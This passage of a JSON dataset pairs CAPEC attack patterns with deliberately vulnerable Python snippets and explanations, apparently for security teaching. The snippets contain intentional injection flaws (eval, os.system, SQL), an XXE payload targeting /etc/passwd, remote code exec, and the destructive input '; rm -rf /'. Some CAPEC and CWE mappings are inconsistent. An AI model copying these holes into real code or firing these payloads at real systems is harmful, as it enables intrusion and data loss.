        "description": "This Python code snippet demonstrates a vulnerability similar to 'Escaping a Sandbox by Calling Code in Another Language' (CAPEC-693). It uses the ctypes library to call native C code from Python, which is analogous to using JNI in Java. The function `unsafe_system_call` allows execution of arbitrary system commands, which can be dangerous. This represents CWE-111 (Direct Use of Unsafe JNI) as it exposes the application to potential security risks inherent in the native code. The example usage includes a benign command and a dangerous one, illustrating how an attacker could exploit this to perform unsafe operations, thereby escaping the sandbox and potentially causing significant harm."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\nfrom urllib.parse import urlparse\n\ndef is_authorized(user, url):\n    # CWE-551: Authorization before parsing and canonicalization\n    if user != 'admin':\n        return False\n    parsed_url = urlparse(url)\n    # CWE-424: Improper Protection of Alternate Path\n    if parsed_url.path.startswith('/admin'): \n        return True\n    return False\n\n# CWE-670: Always-Incorrect Control Flow Implementation\n# CWE-657: Violation of Secure Design Principles\n# CWE-1107: Insufficient Isolation of Symbolic Constant Definitions\nuser = 'guest'\nurl = 'http://example.com/admin/../public'\n\nif is_authorized(user, url):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where authorization checks are performed before URL parsing and canonicalization (CWE-551). The `is_authorized` function checks if the user is 'admin' before parsing the URL, which can lead to bypassing authorization by using crafted URLs. The code also shows improper protection of alternate paths (CWE-424) by not sufficiently validating the URL path. Additionally, the code contains an always-incorrect control flow implementation (CWE-670) and violates secure design principles (CWE-657) by not following best practices for secure coding. The symbolic constant 'admin' is not isolated (CWE-1107), making the code less maintainable and more error-prone."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = hashlib.sha256(password.encode()).hexdigest()\n\n    def authenticate(self):\n        # Client-side check (vulnerable)\n        if self.username == 'admin' and self.password == hashlib.sha256('adminpass'.encode()).hexdigest():\n            return True\n        return False\n\n# Simulated server-side functionality\nclass Server:\n    def __init__(self):\n        self.data = 'Sensitive Data'\n\n    def get_data(self, client):\n        # Server relies on client-side authentication (vulnerable)\n        if client.authenticate():\n            return self.data\n        else:\n            return 'Access Denied'\n\n# Example usage\nclient = Client('admin', 'adminpass')\nserver = Server()\nprint(server.get_data(client))  # Outputs: Sensitive Data\n\n# Malicious client bypassing authentication\nmalicious_client = Client('admin', 'wrongpass')\nmalicious_client.authenticate = lambda: True  # Bypassing client-side check\nprint(server.get_data(malicious_client))  # Outputs: Sensitive Data",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side authentication and authorization checks. The `Client` class performs authentication on the client side, which can be easily bypassed by modifying the client code. The `Server` class relies on the client's authentication result to grant access to sensitive data. This setup is vulnerable because an attacker can create a malicious client that bypasses the authentication check, gaining unauthorized access to the server's sensitive data. This example embodies the main idea of the deprecated CAPEC and related CWEs, particularly CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\ndef main():\n    user_input = input('Enter the file path to read: ')\n    # CWE-99: Improper Control of Resource Identifiers\n    # CWE-20: Improper Input Validation\n    if '..' in user_input or user_input.startswith('/'):\n        print('Invalid file path.')\n    else:\n        content = read_file(user_input)\n        print(content)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic example of resource injection vulnerability. The `read_file` function reads the content of a file specified by the `file_path` parameter. The `main` function takes user input for the file path and attempts to validate it by checking for directory traversal characters ('..') and absolute paths ('/'). However, this validation is insufficient and can be bypassed, leading to potential resource injection attacks. The code represents the main idea of CAPEC-99 (Resource Injection) and highlights CWE-99 (Improper Control of Resource Identifiers) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes user input as code\n# CWE-242: Code Injection\n# CWE-477: Use of Obsolete Function\n\ndef execute_user_code(user_input):\n    # Using eval() is dangerous as it can execute arbitrary code\n    eval(user_input)\n\n# Example usage\nuser_input = input('Enter code to execute: ')\nexecute_user_code(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability (CAPEC-242) by using the eval() function to execute user-provided input. The eval() function is considered dangerous because it can execute arbitrary code, leading to potential security risks. Additionally, the use of eval() can be seen as an example of CWE-477 (Use of Obsolete Function), as it is generally recommended to avoid using eval() due to its security implications. The code takes user input and directly executes it, which can be exploited by an attacker to run malicious code on the system."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-77: Command Injection\n    os.system(f'echo {user_input}')\n\nuser_input = input('Enter a command: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability, specifically a command injection (CWE-77). The function `execute_command` takes user input and directly uses it in an `os.system` call without proper validation or sanitization. This allows an attacker to inject arbitrary commands, potentially leading to malicious code execution. The code highlights the risk of improper neutralization of special elements in commands, which is a common issue in code injection attacks as described in the CAPEC."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS in HTML attributes\n    html_content = f'<a href=\"#\" style=\"color:red\" onmouseover=\"alert(\\'{query}\\')\">Hover over me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) targeting HTML attributes. The application has a single route '/search' that takes a 'query' parameter from the URL. The 'query' parameter is directly inserted into an HTML attribute (onmouseover) without proper sanitization. This allows an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-139 (XSS Targeting HTML Attributes) and is related to several CWEs, including CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable code: directly embedding user input into HTML without proper sanitization\n    html_content = f'<a href=\"javascript:alert(1)\">{query}</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks targeting URI placeholders. The application has a single route '/search' that takes a query parameter 'q' from the URL. The user input is directly embedded into an anchor tag's href attribute without proper sanitization, allowing an attacker to inject a malicious URI such as 'javascript:alert(1)'. When a victim clicks on the link, the malicious script is executed. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input in URI placeholders can lead to XSS attacks. The related CWEs highlight the importance of properly sanitizing user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to doubled character XSS\n    if '<<script>' in query:\n        return 'Invalid input detected!'\n    # Improper neutralization of input\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to 'XSS Using Doubled Characters' as described in the CAPEC. The application has a search endpoint that takes a query parameter from the user. The code attempts to filter out XSS attacks by checking for the presence of '<<script>' in the query. However, this check is insufficient because it does not account for other variations of doubled characters or other forms of XSS attacks. The query is then directly rendered into the HTML response without proper neutralization, making the application vulnerable to XSS attacks. This example highlights the importance of proper input validation and neutralization to prevent XSS vulnerabilities."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Incomplete denylist for XSS protection\n    denylist = ['<script>', '</script>', 'javascript:']\n    for item in denylist:\n        user_input = user_input.replace(item, '')\n    # Vulnerable to XSS via IMG tag attributes\n    response = f'<img src=\"{user_input}\" />'\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application accepts user input via a POST request and attempts to sanitize it using an incomplete denylist, which is a common weakness (CWE-692). The denylist approach fails to cover all possible XSS vectors, leaving the application susceptible to attacks. Additionally, the code directly inserts user input into the 'src' attribute of an IMG tag without proper neutralization (CWE-82), making it vulnerable to XSS attacks. This example embodies the deprecated CAPEC pattern of XSS using Flash by illustrating how improper input handling and incomplete security measures can lead to vulnerabilities."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Improper neutralization of invalid characters\n    if '\\x00' in query or '\\r' in query or '\\n' in query or '\\t' in query:\n        return 'Invalid input detected', 400\n    # Vulnerable to XSS due to improper neutralization of script-related HTML tags\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with a search endpoint that is vulnerable to XSS attacks due to improper neutralization of invalid characters and script-related HTML tags. The 'search' function retrieves a query parameter from the request and checks for invalid characters like null, carriage return, line feed, and tab. However, it fails to properly neutralize special characters such as '<', '>', and '&', which can be interpreted as web-scripting elements. This allows an attacker to inject malicious scripts into the web page, leading to potential XSS attacks. The code highlights the main idea of the CAPEC by showing how invalid characters can be used to bypass input filtering and perform prohibited operations."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The function `execute_command` takes user input and constructs an OS command string using that input. The command is then executed using `os.system()`. If the user input is not properly sanitized, an attacker can inject malicious commands. For example, if the user inputs `; rm -rf /`, it would result in the execution of `ls ; rm -rf /`, potentially causing severe damage. This snippet embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, highlighting the risks of improper neutralization of special elements in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes a command based on user input\ndef execute_command(user_input):\n    # CWE-77: Command Injection vulnerability\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a string to echo: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates a command injection vulnerability (CWE-77) by constructing an OS command using user input without proper neutralization of special elements. The `execute_command` function takes user input and directly incorporates it into a shell command using `os.system`. This can be exploited by an attacker to execute arbitrary commands. For example, if the user inputs `; rm -rf /`, it would result in the deletion of the root directory. This snippet embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper handling of user input can lead to command injection vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulated user input\nuser_input = \"<user><name>admin</name><password>' or '1'='1</password></user>\"\n\n# Vulnerable XML parsing\ntry:\n    root = ET.fromstring(user_input)\n    username = root.find('name').text\n    password = root.find('password').text\n    # Simulated authentication check\n    if username == 'admin' and password == 'admin':\n        print('Authenticated')\n    else:\n        print('Authentication failed')\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a basic example of XML Injection vulnerability. The code simulates user input that is directly parsed and processed without proper validation or neutralization. The user input contains an XML structure with a crafted password field designed to bypass authentication checks. The code uses the `xml.etree.ElementTree` module to parse the XML input and extract the username and password. If the username is 'admin' and the password is 'admin', it prints 'Authenticated'; otherwise, it prints 'Authentication failed'. This example highlights the risk of not properly neutralizing special elements in XML input, which can lead to unauthorized access or data manipulation, embodying the main idea of CAPEC-91 and related CWEs."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\ndef load_local_code(file_path):\n    if not os.path.isabs(file_path):\n        file_path = os.path.abspath(file_path)\n    with open(file_path, 'r') as file:\n        code = file.read()\n    exec(code)\n\n# Example usage\nload_local_code('user_supplied_code.py')",
        "description": "This Python code snippet demonstrates a Local Code Inclusion vulnerability. The function `load_local_code` takes a file path as input, converts it to an absolute path if it is not already, reads the content of the file, and executes it using the `exec` function. This embodies the main idea of CAPEC-214 (Local Code Inclusion) by allowing an attacker to force the application to load and execute arbitrary code files from the local machine. The code also touches on CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it includes and executes code from a potentially untrusted source. Additionally, it implicitly relates to CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not restricting what code can be executed, and CWE-506 (Embedded Malicious Code) as the included code could be malicious."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/load_file')\ndef load_file():\n    filename = request.args.get('filename')\n    if not filename:\n        return 'Filename not provided', 400\n    try:\n        # CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        # CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program\n        # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        # CWE-616: Incomplete Identification of Uploaded File Variables (PHP)\n        # CWE-473: PHP External Variable Modification\n        return send_from_directory('/var/www/files', filename)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has an endpoint '/load_file' that takes a 'filename' parameter from the query string and attempts to serve the file from the '/var/www/files' directory. The code does not validate or sanitize the 'filename' parameter, making it susceptible to Local File Inclusion (LFI) attacks. An attacker could exploit this by providing a path to a sensitive file on the server, leading to unauthorized file access. This example embodies the main idea of the CAPEC by showing how improper handling of user input can lead to the inclusion and execution of arbitrary files, similar to the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a Remote Code Inclusion vulnerability. It downloads a Python script from a remote URL without performing any integrity checks (CWE-494). The downloaded code is then executed using the 'exec' function, which includes functionality from an untrusted control sphere (CWE-829). This can lead to the execution of malicious code, compromising the security of the application."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Vulnerable SOAP message with DTD injection\nsoap_message = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeRequest>\n         <web:input><![CDATA[\n            <!DOCTYPE foo [\n               <!ELEMENT foo ANY >\n               <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n            <foo>&xxe;</foo>\n         ]]></web:input>\n      </web:SomeRequest>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to a vulnerable web service\nresponse = requests.post('http://example.com/webservice', data=soap_message, headers={'Content-Type': 'text/xml'})\n\n# Parsing the response\nroot = etree.fromstring(response.content)\nprint(etree.tostring(root, pretty_print=True).decode())",
        "description": "This Python code snippet demonstrates a SOAP message containing a DTD injection vulnerability. The SOAP message includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the '/etc/passwd' file. When this SOAP message is processed by a vulnerable web service, it may expose sensitive information from the server's file system. This example highlights CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). The code sends the crafted SOAP message to a web service endpoint and prints the response, potentially exposing sensitive data."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import struct\nimport socket\n\ndef handle_soap_request(data):\n    # Extract the length of the array from the SOAP request\n    array_length = struct.unpack('I', data[:4])[0]\n    \n    # Allocate buffer based on the specified length\n    buffer = [0] * array_length\n    \n    # Read the actual data into the buffer\n    for i in range(array_length):\n        buffer[i] = struct.unpack('I', data[4 + i*4:8 + i*4])[0]\n    \n    return buffer\n\n# Simulate receiving a SOAP request with an understated array length\nsoap_request = struct.pack('I', 2) + struct.pack('I', 1) + struct.pack('I', 2) + struct.pack('I', 3)\n\n# Handle the SOAP request\nresult = handle_soap_request(soap_request)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'SOAP Array Overflow' CAPEC. The function `handle_soap_request` processes a SOAP request by extracting the length of an array from the first 4 bytes of the request. It then allocates a buffer based on this length and reads the actual data into the buffer. However, if the actual data length exceeds the specified length, this can lead to a buffer overflow. The example SOAP request understates the array length as 2, but provides data for 3 elements, leading to potential memory corruption. This snippet embodies the main idea of the CAPEC and related CWEs, such as improper handling of length parameters and buffer overflows."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\nclass User:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n# CWE-493: Failure to provide confidentiality for stored data\nusers = [User('admin', 'admin123'), User('user', 'user123')]\n\n# CWE-766: Failure to Protect Stored Data from Modification\ntransaction_data = {'user': 'admin', 'amount': 1000}\n\n# Logging sensitive information (CWE-532)\nlogging.debug(f\"Transaction data: {transaction_data}\")\n\n# Authentication bypass (CWE-287)\ndef authenticate(username, password):\n    for user in users:\n        if user.username == username and user.password == password:\n            return True\n    return False\n\n# Simulate a transaction without proper authentication\nif authenticate('admin', 'wrongpassword'):\n    transaction_data['amount'] += 1000\n    logging.debug(f\"Updated transaction data: {transaction_data}\")\nelse:\n    logging.debug(\"Authentication failed\")",
        "description": "This Python code snippet demonstrates several deprecated CWE weaknesses related to the CAPEC 'Abuse of Transaction Data Structure'. The code includes logging sensitive transaction data (CWE-532), a simple user authentication mechanism that can be bypassed (CWE-287), and failure to protect stored data from modification (CWE-766). The code logs transaction data, attempts to authenticate a user with incorrect credentials, and if successful, modifies the transaction data, logging the updated data. This represents the main idea of the CAPEC by showing how transaction data can be abused through improper handling and security practices."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((self.server_ip, self.server_port))\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side\n        if username == 'admin' and password == 'password':\n            self.sock.send(b'AUTH_SUCCESS')\n        else:\n            self.sock.send(b'AUTH_FAIL')\n\n    def send_data(self, data):\n        self.sock.send(data.encode())\n\n# Example usage\nclient = Client('127.0.0.1', 8080)\nclient.authenticate('admin', 'password')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class connects to a server and performs authentication by checking the username and password on the client side. If the credentials are correct, it sends an 'AUTH_SUCCESS' message to the server. This approach is insecure because an attacker can sniff the network traffic, capture the 'AUTH_SUCCESS' message, and replay it to bypass authentication. This embodies the main idea of the deprecated CAPEC, which involves sniffing and capturing application code during dynamic updates, and CWE-603, which highlights the risks of client-side authentication."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side\n        if username == 'admin' and password == 'password':\n            self.authenticated = True\n        else:\n            self.authenticated = False\n\n    def send_data(self, data):\n        if not self.authenticated:\n            print('Authentication required')\n            return\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n            response = s.recv(1024)\n            print('Received', repr(response))\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.authenticate('admin', 'password')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs authentication locally within the `authenticate` method, which checks the username and password. If the credentials are correct, the client is marked as authenticated and can send data to the server. However, this approach is flawed because the authentication logic is only on the client side, making it easy for an attacker to bypass it by modifying the client code. This vulnerability aligns with CWE-603 (Use of Client-Side Authentication). Additionally, the code does not secure the data transmission, making it susceptible to sniffing and capture-replay attacks (CWE-294). The main idea of the CAPEC is to highlight the risks associated with client-side authentication and the potential for sniffing and capturing application code or sensitive data during transmission."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\n\n# Vulnerable server code that sends application code to a client\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    with open('application_code.py', 'rb') as f:\n        client_socket.send(f.read())\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that sends application code to a client over an unencrypted connection. The server listens on port 8080 and sends the contents of 'application_code.py' to any client that connects. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture application code during its initial distribution. The related CWE-294 (Authentication Bypass by Capture-replay) is relevant here as the server does not authenticate the client, making it possible for an attacker to capture and replay the traffic. Additionally, CWE-603 (Use of Client-Side Authentication) is implied as the server relies on the client to initiate the connection without any server-side authentication checks."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Create a table\ncursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')\nconn.commit()\n\n# Function to fetch user data based on username\n# This function is vulnerable to SQL Injection\n# and can expose sensitive information through error messages\n\ndef get_user_data(username):\n    try:\n        query = f\"SELECT * FROM users WHERE username = '{username}'\"\n        cursor.execute(query)\n        return cursor.fetchall()\n    except Exception as e:\n        # Exposing sensitive information through error message\n        return str(e)\n\n# Example usage\n# An attacker can use a fuzzing technique to send unexpected input\n# to extract sensitive information\nuser_input = \"' OR '1'='1\"  # SQL Injection payload\nprint(get_user_data(user_input))\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerable function `get_user_data` that fetches user data from a SQLite database based on a provided username. The function constructs an SQL query using string interpolation, making it susceptible to SQL Injection (CWE-89). An attacker can exploit this by providing specially crafted input (e.g., `user_input = \"' OR '1'='1\"`) to manipulate the query logic (CWE-943) and retrieve all user records. Additionally, the function catches exceptions and returns the error message directly, potentially exposing sensitive information (CWE-209). This code embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive data beyond what is intended."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef process_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    # CWE-646: Reliance on file extension\n    if not file_path.endswith('.txt'):\n        raise ValueError('Unsupported file type')\n\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Simulate processing the file\n        print('Processing file data...')\n\n# CWE-377: Insecure Temporary File\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\ntry:\n    temp_file.write(b'corrupted data')\n    temp_file.close()\n\n    # CWE-434: Unrestricted upload of dangerous file type\n    process_file(temp_file.name)\nfinally:\n    os.remove(temp_file.name)\n",
        "description": "This Python code snippet demonstrates a scenario where an application processes a file that could be corrupted by an attacker. The `process_file` function checks if the file exists and relies on the file extension to determine if it should process the file (CWE-646). It then reads and processes the file content. A temporary file is created insecurely (CWE-377) and written with corrupted data. The `process_file` function is called with this temporary file, simulating the processing of a potentially dangerous file type (CWE-434). This represents the main idea of the CAPEC, where an application is forced to use a corrupted file, potentially leading to denial of service or other vulnerabilities."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef execute_command():\n    # CWE-1108: Excessive Reliance on Global Variables\n    global ENV_VAR\n    ENV_VAR = os.getenv('DANGEROUS_VAR')\n    \n    # CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n    eval(ENV_VAR)\n\n# CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nENV_VAR = ''\n\nexecute_command()",
        "description": "This Python code snippet demonstrates a vulnerable pattern related to environment variable manipulation, specifically CAPEC-13: Subverting Environment Variable Values. The code retrieves an environment variable 'DANGEROUS_VAR' and uses it directly in an eval() function call, which can lead to code injection (CWE-95). Additionally, the code relies excessively on global variables (CWE-1108) and declares a variable with unnecessarily wide scope (CWE-1126). This combination of issues makes the code highly susceptible to attacks if the environment variable is manipulated by an attacker."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "user_input = 'user_data'\nglobal_var = None\n\ndef set_global_var(value):\n    global global_var\n    global_var = value\n\n# Simulating user-controlled input\nset_global_var(user_input)\n\n# Function that relies on the global variable\ndef process_data():\n    if global_var == 'user_data':\n        print('Processing user data...')\n    else:\n        print('Invalid data')\n\nprocess_data()",
        "description": "This Python code snippet demonstrates the vulnerability of excessive reliance on global variables and improper control of dynamically-identified variables. The `global_var` is declared as a global variable and is set based on user input through the `set_global_var` function. The `process_data` function then relies on this global variable to determine its behavior. This setup is problematic because it allows user input to directly influence the global state of the application, which can lead to security issues such as unauthorized data manipulation or execution of unintended code paths. The code embodies the main idea of the deprecated CAPEC-77 and related CWEs by showcasing how global variables and user-controlled inputs can be misused, leading to potential vulnerabilities."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\n# CWE-180: Validate Before Canonicalize\nuser_input = input('Enter a file path: ')\nif '..' in user_input or user_input.startswith('/'):\n    print('Invalid file path!')\nelse:\n    # Canonicalization step after validation\n    canonical_path = os.path.realpath(user_input)\n    try:\n        with open(canonical_path, 'r') as file:\n            print(file.read())\n    except FileNotFoundError:\n        print('File not found!')\n\n# CWE-95: Eval Injection\nuser_code = input('Enter code to execute: ')\neval(user_code)\n\n# CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nclass User:\n    def __init__(self, name, role):\n        self.name = name\n        self.role = role\n\nuser = User('Alice', 'user')\nuser_input = input('Enter attribute to modify (name/role): ')\nnew_value = input('Enter new value: ')\nsetattr(user, user_input, new_value)\nprint(f'User {user.name} now has role {user.role}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Manipulate Canonicalization' and its associated CWEs. \n\n1. CWE-180: The code validates the user input for a file path before canonicalizing it, which can lead to incorrect behavior if the input changes after canonicalization. This can be exploited to bypass the validation step.\n\n2. CWE-95: The code uses `eval` to execute user-provided code without proper neutralization, leading to potential code injection vulnerabilities.\n\n3. CWE-915: The code allows dynamic modification of object attributes based on user input without proper control, which can lead to unauthorized changes to the object's state.\n\nOverall, the code illustrates the risks of improper input validation, unsafe dynamic code execution, and uncontrolled attribute modification."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\nimport urllib.parse\n\ndef handle_user_input(user_input):\n    # CWE-180: Validate before canonicalize\n    if '..' in user_input or '%' in user_input:\n        raise ValueError('Invalid input')\n    \n    # Canonicalize the input\n    canonical_input = urllib.parse.unquote(user_input)\n    \n    # CWE-73: External control of file name or path\n    file_path = os.path.join('/safe/directory', canonical_input)\n    \n    # CWE-74: Improper neutralization of special elements\n    with open(file_path, 'r') as file:\n        data = file.read()\n        print(data)\n\n# Example usage\ntry:\n    handle_user_input('%2e%2e%2fetc%2fpasswd')\nexcept ValueError as e:\n    print(e)",
